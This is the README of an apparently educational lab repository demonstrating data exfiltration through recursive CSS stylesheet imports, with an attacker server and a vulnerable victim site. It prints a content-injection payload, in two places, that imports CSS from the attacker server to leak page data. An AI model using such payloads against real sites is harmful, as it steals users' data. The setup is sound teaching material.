# Data exfiltration via recursive CSS stylesheet imports

This repository contains two Node.js applications designed as a test bed for demonstrating and learning how to exfil data using the recursive CSS stylesheet imports technique.

## Overview

CSS facilitated data exfil is a technique that allows an attacker to extract data from a victim's browser using crafted stylesheets. This repository contains two separate applications to simulate the attacker's exploit server (`attacker-site`) and the victim (`victim-site`).

### `attacker-site`

The attacker's exploit server is used to carry out the exfiltration that is kicked off by the initial payload:

```
&vuln="/><style>@import%20url(http://127.0.0.1:8089/start)</style>
```

### `victim-site`

The victim's site is vulnerable to content injection and includes an endpoint that the attacker can exploit to load arbitrary CSS. There is a Content-Security-Policy that prevents JavaScript from running to simulate a scenario where Cross-Site Scripting is not feasible.

## Getting Started

Follow these instructions to set up the environment and run the applications.

### Prerequisites

- Node.js (Download from [Node.js website](https://nodejs.org/))
- Git (optional, for cloning the repository)

### Installation

1. Clone the repository or download the files to your local machine.
    ```
    git clone git@github.com:faceteep/css-exfil.git
    ```

2. Navigate to each application directory (`attacker-site` and `victim-site`) and install dependencies.
    ```
    cd attacker-site
    npm install

    cd ../victim-site
    npm install
    ```

### Running the Applications

1. Start the attacker's site:
    ```
    cd attacker-site
    node app.js
    ```
   
2. In a new terminal, start the victim's site:
    ```
    cd victim-site
    node app.js
    ```

## Demonstration

To see the CSS Exfiltration in action, follow these steps:
1. Open the victim's site in a browser.
2. Visit the following 'attacker' crafted link: http://127.0.0.1:5001/?vuln=%22/%3E%3Cstyle%3E@import%20url(http://127.0.0.1:8088/start)%3C/style%3E
3. Observe how the attacker's site receives data through recursive stylesheet imports.

## Acknowledgments

- Most of the attacker-site code was inspired by this repository: https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231.

## Disclaimer

This application is designed for educational purposes. Please use responsibly.
